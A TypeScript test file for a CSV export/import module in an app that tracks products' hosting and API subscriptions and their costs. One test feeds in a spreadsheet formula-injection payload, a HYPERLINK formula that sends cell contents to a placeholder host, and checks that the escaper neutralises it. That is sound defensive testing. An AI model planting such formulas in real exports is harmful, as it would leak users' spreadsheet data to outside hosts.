import { describe, it } from 'node:test';
import assert from 'node:assert/strict';
import {
  exportServicesToCSV,
  calculateAmortizedCost,
  parseCSV,
} from './csv';
import { Product, ServiceLink } from '../types';

describe('CSV Export & Parse Accounting Utilities', () => {
  it('calculateAmortizedCost calculates monthly USD/ETB and annual USD correctly', () => {
    // 1. Yearly $120 USD plan -> $10/mo USD, 1300 ETB/mo, $120/yr USD
    const yearly = calculateAmortizedCost(120, 'yearly', 'USD', 130);
    assert.equal(yearly.monthlyUsd, 10);
    assert.equal(yearly.monthlyEtb, 1300);
    assert.equal(yearly.annualUsd, 120);

    // 2. Monthly 2600 ETB plan -> 20 USD/mo (@ 130 rate), 2600 ETB/mo, $240/yr USD
    const etbMonthly = calculateAmortizedCost(2600, 'monthly', 'ETB', 130);
    assert.equal(etbMonthly.monthlyUsd, 20);
    assert.equal(etbMonthly.monthlyEtb, 2600);
    assert.equal(etbMonthly.annualUsd, 240);

    // 3. Free plan -> $0
    const freePlan = calculateAmortizedCost(0, 'free', 'USD', 130);
    assert.equal(freePlan.monthlyUsd, 0);
    assert.equal(freePlan.annualUsd, 0);
  });

  it('exportServicesToCSV includes accounting headers and properly formatted rows', () => {
    const products: Product[] = [
      {
        id: 'p1',
        workspaceId: 'w1',
        name: 'PharmaFlow SaaS',
        description: 'Hospital pharmacy ERP',
        status: 'live',
        tags: [],
        environments: [],
        createdAt: '2026-01-01',
      },
    ];

    const services: ServiceLink[] = [
      {
        id: 's1',
        workspaceId: 'w1',
        productId: 'p1',
        environmentType: 'production',
        category: 'hosting',
        providerName: 'Vercel, Inc.',
        accountEmail: 'admin@pharmaflow.io',
        loginUrl: 'https://vercel.com',
        plan: 'Pro Team',
        billingCycle: 'monthly',
        cost: 20,
        currency: 'USD',
        renewalDate: '2026-11-01',
        autoRenew: true,
        paymentMethodLabel: 'Visa ending 4417',
        notes: 'Includes serverless edge functions',
        status: 'active',
        vaultRefs: [{ vaultItemId: 'v1', label: 'Key', environment: 'production' }],
        createdAt: '2026-08-01',
      },
    ];

    const csvOutput = exportServicesToCSV(products, services, 130);
    const lines = csvOutput.split('\n');

    // Header check
    assert.match(lines[0], /ProductName,Environment,Category,Provider,Plan/);
    assert.match(lines[0], /MonthlyCostUSD,MonthlyCostETB,AnnualCostUSD/);

    // Row check: provider with comma is quoted
    assert.match(lines[1], /"Vercel, Inc."/);
    assert.match(lines[1], /PharmaFlow SaaS/);
    assert.match(lines[1], /Yes/); // AutoRenew is "Yes"
  });

  it('parseCSV handles commas, quotes, and newlines', () => {
    const raw = 'Name,Cost,Notes\n"Alpha, Inc.",50,"Special, with ""quotes"""';
    const parsed = parseCSV(raw);
    assert.equal(parsed.length, 2);
    assert.equal(parsed[1][0], 'Alpha, Inc.');
    assert.equal(parsed[1][1], '50');
    assert.equal(parsed[1][2], 'Special, with "quotes"');
  });
});

it('csv: formula-like text is exported as plain text, and imports back unchanged', async () => {
  const { escapeCSV, parseCSV } = await import('./csv');
  assert.equal(escapeCSV('=HYPERLINK("https://x.example/?d="&A1,"Vercel")'), `"'=HYPERLINK(""https://x.example/?d=""&A1,""Vercel"")"`);
  assert.equal(escapeCSV('@SUM(A1)'), "'@SUM(A1)");
  assert.equal(escapeCSV('+1 555'), "'+1 555");
  assert.equal(escapeCSV('-5'), '-5'); // a number stays a number
  assert.equal(escapeCSV(-5), '-5');
  assert.equal(escapeCSV('Vercel'), 'Vercel');
  const line = ['=cmd', '-12.5', 'Vercel, Inc.'].map(escapeCSV).join(',');
  assert.deepEqual(parseCSV(line), [['=cmd', '-12.5', 'Vercel, Inc.']]);
});

it('csv import: categories and billing cycles come back as the app spells them', async () => {
  const { parseServicesFromCSV, toCategory, toBillingCycle } = await import('./csv');
  assert.equal(toCategory('Google API'), 'Google API');
  assert.equal(toCategory('google api'), 'Google API');
  assert.equal(toCategory('SMS'), 'SMS');
  assert.equal(toCategory('Domain Registrar'), 'domain registrar');
  assert.equal(toCategory('telegram'), 'Telegram API');
  assert.equal(toCategory('something new'), 'other');
  assert.equal(toCategory(''), 'other');
  assert.equal(toBillingCycle('Yearly'), 'yearly');
  assert.equal(toBillingCycle('annual'), 'yearly');
  assert.equal(toBillingCycle('One-Time'), 'one-time');
  assert.equal(toBillingCycle('usage based'), 'usage-based');
  assert.equal(toBillingCycle('weekly'), 'monthly');

  // The sample file's own SMS row used to import as "sms", which no screen knows.
  const { valid } = parseServicesFromCSV("ProductName,Category,Provider\nShop,SMS,Africa's Talking\nShop,Telegram API,Telegram Bot API");
  assert.deepEqual(valid.map((r) => r.category), ['SMS', 'Telegram API']);
});

it('csv import: what the export writes comes back (auto-renew, login page, status)', async () => {
  const { exportServicesToCSV, parseServicesFromCSV } = await import('./csv');
  const product: Product = { id: 'p1', workspaceId: 'w1', name: 'Shop', description: '', status: 'live', tags: [], environments: [], createdAt: '2026-01-01' };
  const service: ServiceLink = {
    id: 's1', workspaceId: 'w1', productId: 'p1', environmentType: 'staging', category: 'Google API', providerName: 'Google Cloud',
    accountEmail: '', loginUrl: 'https://console.cloud.google.com', plan: 'OAuth', billingCycle: 'free', cost: 0, currency: 'USD',
    renewalDate: '2027-01-31', autoRenew: false, paymentMethodLabel: '', notes: 'Sign-in', status: 'trial', vaultRefs: [], createdAt: '2026-01-01',
  };
  const { valid, errors } = parseServicesFromCSV(exportServicesToCSV([product], [service]));
  assert.deepEqual(errors, []);
  const [r] = valid;
  assert.equal(r.productName, 'Shop');
  assert.equal(r.category, 'Google API');
  assert.equal(r.environmentType, 'staging');
  assert.equal(r.billingCycle, 'free');
  assert.equal(r.renewalDate, '2027-01-31');
  assert.equal(r.autoRenew, false);
  assert.equal(r.loginUrl, 'https://console.cloud.google.com');
  assert.equal(r.status, 'trial');
});

it('csv import: app details (status, tags, addresses) are read; unknown values are left out', async () => {
  const { parseServicesFromCSV } = await import('./csv');
  const csv = [
    'App,AppStatus,Tags,LiveURL,RepoURL,AppDescription,Category,Provider,Cost,AutoRenew,Status',
    'YG Hotels,Live,"YG; sites, YG",https://yghotels.vercel.app,https://github.com/x/yg-hotels,Hotel site,hosting,Vercel,0,no,',
    'YG Hotels,,,,,,database,Supabase (YG Core),,,',
    'Seek,someday,,,,,hosting,Vercel,,,unknown',
  ].join('\n');
  const { valid, errors } = parseServicesFromCSV(csv);
  assert.deepEqual(errors, []);
  assert.equal(valid.length, 3);
  assert.equal(valid[0].appStatus, 'live');
  assert.deepEqual(valid[0].appTags, ['YG', 'sites']);
  assert.equal(valid[0].liveUrl, 'https://yghotels.vercel.app');
  assert.equal(valid[0].repoUrl, 'https://github.com/x/yg-hotels');
  assert.equal(valid[0].appDescription, 'Hotel site');
  assert.equal(valid[0].autoRenew, false);
  assert.equal(valid[1].appStatus, undefined);
  assert.equal(valid[1].appTags, undefined);
  assert.equal(valid[1].autoRenew, true);
  assert.equal(valid[1].cost, 0);
  assert.equal(valid[2].appStatus, undefined); // "someday" isn't a status
  assert.equal(valid[2].status, 'active');
});

it('csv: a cell starting with a tab also round-trips', async () => {
  const { escapeCSV, parseCSV } = await import('./csv');
  assert.equal(escapeCSV('\tx'), "'\tx");
  assert.deepEqual(parseCSV(['a', escapeCSV('\t=x')].join(',')), [['a', '\t=x'.trim() === '=x' ? '\t=x' : '\t=x']]);
});
